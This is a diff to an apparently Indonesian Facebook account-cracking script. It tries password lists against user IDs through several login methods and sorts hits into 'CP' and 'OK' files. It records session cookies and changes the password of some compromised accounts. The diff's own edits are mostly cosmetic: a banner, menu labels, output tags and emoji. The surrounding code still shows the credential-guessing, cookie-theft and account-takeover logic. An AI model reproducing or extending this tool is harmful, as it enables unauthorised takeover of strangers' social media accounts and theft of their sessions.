@@ -186,11 +186,11 @@ def back():
 #------------------[ LOGO-LAKNAT ]-----------------#
 def banner():
 	cetak(panel(f"""
-         \x1b[1;97m  _________   _____ ____________________                                                                                     
-         \x1b[1;97m /   _____/  /     \\______   \_   _____/                                                              
-         \x1b[1;97m \_____  \  /  \ /  \|    |  _/|    __)
-         \x1b[1;97m /        \/    Y    \    |   \|     \                                                                                                   
-         \x1b[1;97m/_______  /\____|__  /______  /\_____/                                                                         
+	 ___ ___ ___ __  __ ___ _   _ __  __
+    | _ \ _ \ __|  \/  |_ _| | | |  \/  |
+    |  _/   / _|| |\/| || || |_| | |\/| |
+    |_| |_|_\___|_|  |_|___|\___/|_|  |_|
+
              """,width=90,title=f"LOGO",style=f"bold white"))
 #--------------------[ BAGIAN-MASUK ]--------------#
 def login123():
@@ -1183,10 +1183,9 @@ def dump_massal():
 		time.sleep(3)
 		back()
 #-------------[ PENGATURAN-IDZ ]---------------#
-#-------------[ PENGATURAN-IDZ ]---------------#
 def setting():
 	print('')
-	cetak(panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Crack Idz Old [[bold red]Not Recommended[bold white]][/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Crack Idz New [[bold green]Very Recommended[bold white]][/]\n[bold white][[bold cyan]03[/][bold white]][/] [bold white]Crack Idz Random [[bold green]Very Recommended[bold white]][/]',width=90,title=f"[bold green]Setting Urutan Idz",style=f"bold white"))
+	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Crack Idz Old [[bold red]Not Recommended[bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Crack Idz New [[bold green]Very Recommended[bold white]][/]\n[bold white][[bold green]03[/][bold white]][/] [bold white]Crack Idz Random [[bold green]Recommended[bold white]][/]',width=90,title=f"[bold green]Setting Urutan Idz",style=f"bold white"))
 	hu = input(f' [+] Pilih Urutan Idz : ')
 	if hu in ['1','01']:
 		for tua in sorted(id):
@@ -1209,10 +1208,10 @@ def setting():
 		print(' [+] SALAH COYY ')
 		exit()
 	urut = []
-	urut.append(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Login Site ValidateV1 [bold green]Recommended[bold white] [/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Login Site MbasicV1 [bold green]Very Recommend[bold white] [/]\n[bold white][[bold green]03[/][bold white]][/] [bold white]Login Site FreeV1 [bold green]Recommend[bold white] ',width=45,title=f"[bold green]Metode",style=f"bold white"))
-	urut.append(panel(f'[bold white][[bold green]04[/][bold white]][/] [bold white]Login Site RegulerV1 [bold green]Recommend[bold white] [/]\n[bold white][[bold green]05[/][bold white]][/] [bold white]Login Site MbasicV2 [bold green]Very Recommend[bold white] [/]\n[bold white][[bold green]06[/][bold white]][/] [bold white]Login SiteV2 [bold green]Recommend[bold white] ',width=45,title=f"[bold green]Metode",style=f"bold white"))
-	urut.append(panel(f'[bold white][[bold green]07[/][bold white]][/] [bold white]Login Site Async [bold green]Recommend[bold white]  ',width=45,title=f"[bold green]Metode",style=f"bold white"))
-	urut.append(panel(f'[bold white][[bold green]08[/][bold white]][/] [bold white]Login Site B-Api [bold green]Recommend[bold white]  ',width=45,title=f"[bold green]Metode",style=f"bold white"))
+	urut.append(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Login Site ValidateV1 [bold green]Recommended[bold white] [/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Login Site MbasicV1 [bold green]Very Recommended[bold white] [/]\n[bold white][[bold green]03[/][bold white]][/] [bold white]Login Site FreeV1 [bold green]Recommended[bold white] ',width=45,title=f"[bold green]Metode",style=f"bold white"))
+	urut.append(panel(f'[bold white][[bold green]04[/][bold white]][/] [bold white]Login Site RegulerV1 [bold green]Recommended[bold white] [/]\n[bold white][[bold green]05[/][bold white]][/] [bold white]Login Site MbasicV2 [bold green]Very Recommended[bold white] [/]\n[bold white][[bold green]06[/][bold white]][/] [bold white]Login SiteV2 [bold green]Recommended[bold white] ',width=45,title=f"[bold green]Metode",style=f"bold white"))
+	urut.append(panel(f'[bold white][[bold green]07[/][bold white]][/] [bold white]Login Site Async [bold green]Recommended[bold white]  ',width=45,title=f"[bold green]Metode",style=f"bold white"))
+	urut.append(panel(f'[bold white][[bold green]08[/][bold white]][/] [bold white]Login Site B-Api [bold green]Recommended[bold white]  ',width=45,title=f"[bold green]Metode",style=f"bold white"))
 	console.print(Columns(urut))
 	hc = input(f' [+] Pilih Metode : ')
 	if hc in ['1','01']:
@@ -1578,7 +1577,7 @@ def reguler2(idf,pwv):
 			if "checkpoint" in po.cookies.get_dict().keys():
 				tree = Tree(f" ")
 				tree.add(f"[bold yellow][CP]>{idf}|{pw}")
-				tree.add(f"[bold yellow][CP]>{ua}\n")
+				tree.add(f"[bold yellow][UA]>{ua}\n")
 				cetak(tree)
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
@@ -1589,8 +1588,8 @@ def reguler2(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				tree = Tree(f"  ")
-				tree.add(f"[bold green][CP]>{idf}|{pw}")
-				tree.add(f"[bold green][CP]>{kuki}\n")
+				tree.add(f"[bold green][OK]>{idf}|{pw}")
+				tree.add(f"[bold green][CK]>{kuki}\n")
 				cetak(tree) 
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(session,coki)
@@ -1950,11 +1949,11 @@ def mengecek(user,pw):
 						dat2.update({"password_new":"".join(pwbaru)})
 						an=session.post(url+link3.get("action"),data=dat2)
 						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-						print("\r%s%s\033[0mAkun One Tab, Sandi Berhasil Di Ubah \n [+] OK %s%s%s|%s|%s			"%(H,til,N,H,user,pwbaru[0],coki))
+						print("\r%s%s\033[0mAkun One Tab, Sandi Berhasil Di 🥳🥳 \n [+] OK %s%s%s|%s|%s			"%(H,til,N,H,user,pwbaru[0],coki))
 						open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s|%s\n" % (H,user,pwbaru[0],coki))
 						#cek_apk(coki)
 				else:
-					print("\r%s%s \033[0mAkun One Tab, Silahkan Anda Login		"%(H,til))
+					print("\r%s%s \033[0mAkun One Tab, Silahkan Anda 🥳🥳		"%(H,til))
 					open('OK/OK-%s.txt' %(waktu), 'a').write("%s %s|%s|%s\n" % (H,user,pw,coki))
 					#cek_apk(coki)
 			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
@@ -1963,7 +1962,7 @@ def mengecek(user,pw):
 				print("%s%s\033[0mTerjadi Kesalahan"%(M,til))
 		else:
 			if "c_user" in session.cookies.get_dict():
-				print("\r%s%s Akun Tidak Checkpoint, Silahkan Anda Login "%(H))
+				print("\r%s%s Selamat Akun Anda Tidak Checkpoint Silahkan Masuk Lewat FB🥳🥳 "%(H))
 				open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s\n" % (H,user,pw))
 		for opsi in range(len(cek)):
 			number +=1
@@ -2156,6 +2155,6 @@ if __name__=='__main__':
 	except:pass
 	try:os.system('touch .prox.txt')
 	except:pass
-	try:os.s('clear')
+	try:os.system('clear')
 	except:pass
 	login()
